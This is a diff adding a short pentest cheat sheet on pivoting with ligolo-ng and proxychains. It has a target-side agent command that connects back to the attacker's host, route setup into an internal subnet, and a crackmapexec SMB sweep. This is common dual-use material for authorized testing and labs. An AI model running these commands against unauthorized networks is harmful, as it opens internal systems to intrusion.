@@ -1,0 +1,12 @@
+
+ligolo-ng
+Create ligolo interface:sudo ip tuntap add user $(whoami) mode tun ligolo
+Bring ligolo interface up:sudo ip link set ligolo up
+Start ligolo proxy (Attacker):./proxy -laddr 0.0.0.0:9001 -selfcert
+Connect to proxy (Target):agent.exe -connect \<LHOST\>:9001 -ignore-cert
+Select session (Ligolo console):session
+Check target interface (Ligolo console):ifconfig
+Start tunneling (Ligolo console):start
+Add route to internal network (Attacker):sudo ip r add \<subnet\> dev ligolo
+proxychains
+Run command through proxychains:proxychains4 crackmapexec smb 10.10.10.0/24
